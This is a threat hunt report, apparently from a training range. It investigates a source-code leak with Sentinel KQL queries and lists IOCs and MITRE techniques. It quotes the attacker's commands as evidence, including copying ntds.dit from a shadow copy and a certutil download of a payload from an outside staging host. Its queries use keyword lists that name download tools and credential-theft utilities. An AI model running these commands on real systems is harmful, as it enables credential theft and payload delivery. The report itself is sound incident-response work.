# Threat Hunt Report – EmberForge Source Leak Investigation

# Environment Details

| Item                 | Value                                       |
| -------------------- | ------------------------------------------- |
| SIEM Platform        | Microsoft Sentinel                          |
| Workspace            | law-cyber-range                             |
| Investigation Window | 2026-01-30 21:00 UTC – 2026-01-31 00:00 UTC |
| Custom Log Table     | EmberForgeX_CL                              |

---

# 2. Data Collection & Archive Creation

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("zip", "rar", "7z", "tar", "archive", "compress")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```


### Screenshot

<img width="908" height="304" alt="image" src="https://github.com/user-attachments/assets/b06ef146-9644-4c2b-9db0-c323ec49fc93" />


---

# 3. Exfiltration Tool Discovery

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "rclone"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```


### Screenshot

<img width="854" height="268" alt="image" src="https://github.com/user-attachments/assets/1f0bca93-d1b6-4944-8554-a0d25c3c247c" />


---

# 4. Attacker Email Attribution

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "rclone"
| project TimeGenerated, Computer, EventCode_s, CommandLine_s
| order by TimeGenerated asc
```

### Screenshot

<img width="1074" height="339" alt="image" src="https://github.com/user-attachments/assets/2abbc38e-ec34-4f2a-a99a-8c0502e16897" />


---

# 5. Plaintext Credential Exposure

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("pass", "password", "mega-pass", "config create")
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

### Screenshot

<img width="845" height="258" alt="image" src="https://github.com/user-attachments/assets/0e5cd08f-969b-4e31-9074-091412a99f1c" />


---

# 6. Exfiltration Destination IP

## Query Used

```kql
EmberForgeX_CL
| where EventCode_s == "3"
| where Image_s has "rclone"
| project TimeGenerated,
          Computer,
          Image_s,
          DestinationIp_s,
          DestinationPort_s
| order by TimeGenerated asc
```

### Screenshot

<img width="838" height="252" alt="image" src="https://github.com/user-attachments/assets/abe621f1-41d0-42a0-b0ee-056721819e33" />


---

# 7. Active Directory Credential Database Theft

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("vssadmin", "shadow", "ntds", "diskshadow", "copy")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
```

## Findings

| Artifact            | Value    |
| ------------------- | -------- |
| Credential Database | ntds.dit |

### Screenshot

(Add screenshot here)

---

# 8. Staging Infrastructure Discovery

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any (
    "Invoke-WebRequest",
    "iwr",
    "curl",
    "wget",
    "certutil",
    "bitsadmin",
    "download"
)
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe
```

## Findings

| Artifact           | Value                   |
| ------------------ | ----------------------- |
| Staging Server     | sync.cloud-endpoint.net |
| Downloaded Payload | update.exe              |

### Screenshot

(Add screenshot here)

---

# 9. DNS Infrastructure Correlation

## Query Used

```kql
EmberForgeX_CL
| where EventCode_s == "22"
| where QueryName_s !contains "emberforge.local"
| summarize count() by QueryName_s
| order by count_ desc
```


### Screenshot

<img width="876" height="277" alt="image" src="https://github.com/user-attachments/assets/d6d59adf-1c0f-4ae6-8a41-1e5da923bd81" />


---

# Indicators of Compromise (IOCs)

| Type                | Value                                                 |
| ------------------- | ----------------------------------------------------- |
| Domain              | sync.cloud-endpoint.net                               |
| IP Address          | 66.203.125.15                                         |
| Email               | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |
| Tool                | rclone.exe                                            |
| Tool                | update.exe                                            |
| Archive             | gamedev.zip                                           |
| Sensitive Directory | C:\GameDev                                            |

---

# MITRE ATT&CK Techniques Observed

| Technique                     | ID        |
| ----------------------------- | --------- |
| PowerShell                    | T1059.001 |
| Command Shell                 | T1059.003 |
| Data from Local System        | T1005     |
| Archive via Utility           | T1560.001 |
| Exfiltration to Cloud Storage | T1567.002 |
| Ingress Tool Transfer         | T1105     |
| NTDS Credential Dumping       | T1003.003 |
| Unsecured Credentials         | T1552     |

---

# Conclusion

The investigation confirmed successful compromise activity involving:

* malicious tool transfer,
* archive staging,
* cloud exfiltration,
* credential exposure,
* and Active Directory credential theft.

The attacker leveraged Living Off The Land techniques and legitimate administrative tooling to evade detection while staging and exfiltrating sensitive company data.
